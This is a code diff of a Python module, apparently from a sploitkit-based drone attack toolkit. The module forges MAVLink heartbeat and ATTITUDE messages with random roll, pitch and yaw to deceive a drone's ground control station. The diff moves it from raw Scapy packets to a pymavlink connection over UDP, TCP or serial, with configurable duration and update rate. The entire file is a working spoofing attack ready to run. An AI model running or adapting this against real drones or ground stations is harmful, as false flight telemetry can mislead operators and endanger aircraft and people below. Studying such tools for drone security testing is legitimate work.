@@ -1,61 +1,56 @@
-from sploitkit import Module, Config, Option
+from sploitkit import Config, Option
+from lib.base import MAVLinkModule
 from pymavlink import mavutil
-from scapy.all import send, IP, UDP, Raw
 import time
 import random
 import sys
 
-class AttitudeSpoofing(Module):
+class AttitudeSpoofing(MAVLinkModule):
     """
-    Spoof the drone's attitude data (pitch, roll, yaw) 
-    to mislead the Ground Control Station (GCS).
+    Spoof the drone's attitude data (pitch, roll, yaw) to mislead the Ground Control Station (GCS).
+
+    Connection:
+        Supports both network and serial connections:
+        - Network: udp:10.13.0.6:14550 or tcp:10.13.0.6:5760
+        - Serial: /dev/ttyUSB0 (Linux) or COM3 (Windows)
+
+    Usage:
+        set connection udp:10.13.0.6:14550
+        set duration 60
+        run
     """
 
-    # Configuration for the spoofing module
-    config = Config({
-        Option(
-            name='target_ip',
-            description='IP of the target GCS or drone',
-            required=True,
-        ): "10.13.0.6",  # Default value
-        Option(
-            name='target_port',
-            description='MavLink Port',
-            required=True,
-        ): "14550",  # Default value
+    # Inherit connection config from base class and add module-specific options
+    config = MAVLinkModule.config + Config({
         Option(
             name='duration',
-            description='Duration of tampering in seconds',
+            description='Duration of spoofing in seconds (0 for infinite)',
             required=False,
-        ): 10  # Default value
+        ): "60",  # Default value
+        Option(
+            name='update_rate',
+            description='Attitude update rate in Hz',
+            required=False,
+        ): "10",  # Default value
     })
 
-    def create_heartbeat(self):
+    def send_heartbeat(self, master):
         """
-        Create a MAVLink heartbeat message.
+        Send a spoofed MAVLink heartbeat message.
         """
-        mav = mavutil.mavlink.MAVLink(None)
-        mav.srcSystem = 1
-        mav.srcComponent = 1
-
-        heartbeat = mav.heartbeat_encode(
+        master.mav.heartbeat_send(
             type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
             autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
             base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
-            custom_mode=3,  # Custom mode to indicate flying (ArduCopter: GUIDED mode)
+            custom_mode=3,  # GUIDED mode
             system_status=mavutil.mavlink.MAV_STATE_ACTIVE
         )
 
-        return heartbeat.pack(mav)
-
-    def create_attitude(self):
+    def send_attitude(self, master):
         """
-        Create a MAVLink ATTITUDE message with random values.
+        Send a spoofed MAVLink ATTITUDE message with random values.
         """
-        mav = mavutil.mavlink.MAVLink(None)
-        mav.srcSystem = 1
-        mav.srcComponent = 1
-
+        # Generate random attitude values
         roll = random.uniform(-1.0, 1.0)
         pitch = random.uniform(-1.0, 1.0)
         yaw = random.uniform(-3.14, 3.14)
@@ -63,45 +58,76 @@ class AttitudeSpoofing(Module):
         pitchspeed = random.uniform(-0.1, 0.1)
         yawspeed = random.uniform(-0.1, 0.1)
 
-        attitude = mav.attitude_encode(
-            time_boot_ms=int(time.time() * 1e3) % 4294967295,  # Time since boot in milliseconds, using modulo to ensure valid range
-            roll=roll,  # Roll angle (rad)
-            pitch=pitch,  # Pitch angle (rad)
-            yaw=yaw,  # Yaw angle (rad)
-            rollspeed=rollspeed,  # Roll angular speed (rad/s)
-            pitchspeed=pitchspeed,  # Pitch angular speed (rad/s)
-            yawspeed=yawspeed  # Yaw angular speed (rad/s)
+        # Send attitude message
+        master.mav.attitude_send(
+            time_boot_ms=int(time.time() * 1e3) % 4294967295,
+            roll=roll,
+            pitch=pitch,
+            yaw=yaw,
+            rollspeed=rollspeed,
+            pitchspeed=pitchspeed,
+            yawspeed=yawspeed
         )
 
-        return attitude.pack(mav)
-
-    def send_mavlink_packet(self, packet_data, target_ip, target_port):
-        """
-        Send a MAVLink packet using Scapy.
-        """
-        packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
-        send(packet)
-
     def run(self):
-        # Retrieve the target IP, port, and duration from the config
-        target_ip = self.config['target_ip']
-        target_port = int(self.config['target_port'])
+        # Retrieve configuration options
         duration = int(self.config['duration'])
+        update_rate = int(self.config['update_rate'])
 
-        start_time = time.time()
+        separator = "=" * 80
+        self.logger.info(separator)
+        self.logger.info("Attitude Spoofing Attack")
+        self.logger.info(separator)
+        self.logger.warning("This will inject false attitude data into the MAVLink stream")
+        self.logger.info(f"Update Rate: {update_rate} Hz")
+        if duration > 0:
+            self.logger.info(f"Duration: {duration} seconds")
+        else:
+            self.logger.info("Duration: Infinite (Ctrl+C to stop)")
+        self.logger.info(separator)
 
-        # Main spoofing loop
-        while True:
-            # Check if the duration has been reached
-            if time.time() - start_time >= duration:
-                self.logger.info(f"Tampering duration of {duration} seconds reached. Stopping...")
-                break
+        try:
+            # Connect to the MAVLink device (supports both serial and network)
+            master = self.connect_drone()
 
-            heartbeat_packet = self.create_heartbeat()
-            attitude_packet = self.create_attitude()
+            # Set spoofed system ID (optional - spoof as system 1)
+            master.source_system = 1
+            master.source_component = 1
 
-            self.send_mavlink_packet(heartbeat_packet, target_ip, target_port)
-            self.send_mavlink_packet(attitude_packet, target_ip, target_port)
+            start_time = time.time()
+            count = 0
+            interval = 1.0 / update_rate
 
-            self.logger.info(f"Sent heartbeat and ATTITUDE packets to {target_ip}:{target_port}")
-            time.sleep(1)  # Send packets at a regular interval
+            # Main spoofing loop
+            while True:
+                # Check if the duration has been reached
+                if duration > 0 and (time.time() - start_time >= duration):
+                    self.logger.info(f"Spoofing duration of {duration} seconds reached. Stopping...")
+                    break
+
+                # Send spoofed heartbeat and attitude messages
+                self.send_heartbeat(master)
+                self.send_attitude(master)
+
+                count += 1
+
+                if count % (update_rate * 10) == 0:
+                    elapsed = time.time() - start_time
+                    self.logger.info(f"Sent {count} spoofed packets ({elapsed:.1f}s elapsed)")
+
+                time.sleep(interval)
+
+            self.logger.success(f"\n{separator}")
+            self.logger.success(f"Attitude Spoofing Completed")
+            self.logger.success(f"Total packets sent: {count}")
+            self.logger.success(f"{separator}")
+
+        except KeyboardInterrupt:
+            self.logger.info("\n\nAttack interrupted by user")
+        except Exception as e:
+            self.logger.error(f"Error during spoofing: {str(e)}")
+            import traceback
+            self.logger.error(traceback.format_exc())
+        finally:
+            # Clean up connection
+            self.close_connection(master)
